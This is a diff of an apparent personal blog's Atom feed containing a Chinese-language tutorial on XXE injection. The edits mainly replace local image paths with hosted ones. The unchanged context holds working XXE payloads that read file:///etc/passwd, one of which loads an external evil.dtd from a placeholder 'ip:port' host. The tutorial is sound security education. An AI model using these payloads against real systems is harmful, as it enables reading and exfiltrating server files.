@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://outlaws-bai.github.io</id>
     <title>outlaws&apos; blog</title>
-    <updated>2021-03-19T01:24:20.523Z</updated>
+    <updated>2021-03-19T01:36:15.581Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://outlaws-bai.github.io"/>
     <link rel="self" href="https://outlaws-bai.github.io/atom.xml"/>
@@ -22,7 +22,7 @@
 <p>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，</p>
 <h2 id="xml基础知识">XML基础知识</h2>
 <p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
-<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5Cbai%5CDesktop%5Cxxe.png" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://outlaws-bai.github.io/post-images/1616117231952.png" alt="" loading="lazy"></figure>
 <p><strong>示例代码：</strong></p>
 <pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
@@ -59,7 +59,7 @@
 
 </code></pre>
 <h2 id="xxe注入">XXE注入</h2>
-<figure data-type="image" tabindex="2"><img src="D:%5Cctf%5C%E6%96%B9%E5%90%91%5Cweb%5Cxxe%5Cxxe.assets%5Cimage-20210319092023974.png" alt="image-20210319092023974" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://outlaws-bai.github.io/post-images/1616117288890.png" alt="" loading="lazy"></figure>
 <h3 id="xxe分类">XXE分类</h3>
 <p>按照构造外部实体声明的方法不同</p>
 <p>1.直接通过dtd外部实体声明</p>
@@ -71,8 +71,8 @@
 <p>3.Blind XXE</p>
 <h2 id="怎样利用">怎样利用</h2>
 <h3 id="1直接通过dtd外部实体声明">1.直接通过DTD外部实体声明</h3>
-<figure data-type="image" tabindex="3"><img src="C:%5CUsers%5C86180%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201231105601250.png" alt="image-20201231105601250" loading="lazy"></figure>
-<figure data-type="image" tabindex="4"><img src="C:%5CUsers%5Cbai%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210223144930380.png" alt="image-20210223144930380" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://outlaws-bai.github.io/post-images/1616117349724.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://outlaws-bai.github.io/post-images/1616117447564.png" alt="" loading="lazy"></figure>
 <pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE xxe[
     &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
@@ -87,7 +87,7 @@ eg:
 &lt;user&gt;&lt;username&gt;&amp;f;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
 </code></pre>
 <h3 id="2通过dtd文档引入外部dtd文档的外部实体声明">2.通过dtd文档引入外部dtd文档的外部实体声明</h3>
-<figure data-type="image" tabindex="5"><img src="C:%5CUsers%5C86180%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201231110237503.png" alt="image-20201231110237503" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://outlaws-bai.github.io/post-images/1616117486544.png" alt="" loading="lazy"></figure>
 <pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE xxe SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;
 &lt;a&gt;&amp;b;&lt;/a&gt;
@@ -96,7 +96,6 @@ eg:
 &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
 </code></pre>
 <h3 id="3通过dtd外部实体声明引入外部dtd文档中的外部实体声明">3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明</h3>
-<figure data-type="image" tabindex="6"><img src="C:%5CUsers%5C86180%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201231111214776.png" alt="image-20201231111214776" loading="lazy"></figure>
 <pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE xxe [
     &lt;!ENTITY % file SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;
@@ -138,7 +137,7 @@ eg:
 <p>6.文件上传</p>
 <p>7.钓鱼</p>
 <h2 id="支持的协议">支持的协议</h2>
-<figure data-type="image" tabindex="7"><img src="D:%5Cctf%5C%E6%96%B9%E5%90%91%5Cweb%5Cxxe%5Cxxe.assets%5Cimage-20210319092048859.png" alt="image-20210319092048859" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://outlaws-bai.github.io/post-images/1616117748994.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
